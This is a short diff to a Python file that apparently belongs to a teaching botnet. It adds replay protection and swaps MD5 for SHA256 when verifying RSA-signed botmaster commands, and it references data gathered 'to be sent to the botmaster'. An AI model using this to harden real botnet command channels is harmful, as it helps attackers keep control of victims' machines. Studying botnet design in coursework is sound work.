@@ -1,13 +1,13 @@
 import os
 from Crypto.PublicKey import RSA
 from Crypto.Hash import MD5
-
+from Crypto.Hash import SHA256
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
 # Valuable data to be sent to the botmaster
 valuables = []
-
+messageIds = set()
 ###
 
 def save_valuable(data):
@@ -44,11 +44,14 @@ def verify_file(f):
     if(len(lines) < 3):
         return False
     signature = str(lines[0], "ascii")
-    text = str(lines[1], "ascii")
+    text = str(lines[1], "ascii")  
+    if(text in messageIds):
+        return False
+    messageIds.add(text)
     if(not signature.isdigit()):
         return False
     signature = (int(signature),)
-    hash = MD5.new(text.encode('utf-8')).digest()
+    hash = SHA256.new(text.encode('utf-8')).digest()
     with open('pub_key', 'r') as f:
         pub_key = RSA.importKey(f.read())
     return pub_key.verify(hash, signature)
